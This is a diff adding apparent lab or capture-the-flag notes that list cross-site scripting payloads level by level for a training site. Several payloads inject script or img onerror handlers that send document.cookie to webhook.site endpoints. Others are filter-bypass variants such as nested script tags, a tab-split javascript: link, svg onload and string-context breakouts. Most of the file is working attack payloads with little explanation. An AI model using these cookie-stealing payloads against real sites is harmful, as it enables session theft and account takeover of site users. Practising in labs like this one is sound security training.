@@ -1,0 +1,25 @@
+alert(origin);
+
+fetch(url).then(function (response) {return response.text()}
+level 1:https://note1.cyberjutsu-lab.tech/search?q=%3Cscript%3Efetch(%27https%3a//webhook.site/3149f4c4-1102-4400-b415-a79c61400641/%27%2bdocument.cookie)%3C/script%3E
+level 2:https://note2.cyberjutsu-lab.tech/search?q=%3Cscri%3Cscript%3Ept%3Efetch(%27https%3a//webhook.site/3149f4c4-1102-4400-b415-a79c61400641/%27%2bdocument.cookie)%3C/scr%3Cscript%3Eipt%3E
+level 3:
+<script>
+<img src=1 onerror="fetch('https://webhook.site/b43acf3e-ccdd-4eb1-9bc8-ad049fdba717/'+document.cookie)"></img>
+<img+src%3d1+onerror%3d"fetch('https://webhook.site/3f2f695d-152c-44ff-9368-54b7f0c4ed70/'%2bdocument.cookie)"></img>
+<img+src=1+on......="alert(1)"></img>
+<script nonce="404">alert(1);</script>
+script<script>alert(1)</script>
+
+-------------------------------------------------------location.search
+level 5: redirect  --> javascript:......
+<a href="javascrip%09t:alert(1)">ok
+
+level 6: https://ejs.co/
+<%-
+<%=
+
+"><svg onload=alert(1)>
+
+-------------------------------------------------------unstrust data is in a values;
+<script>var a=''-alert(1)-'';</script>
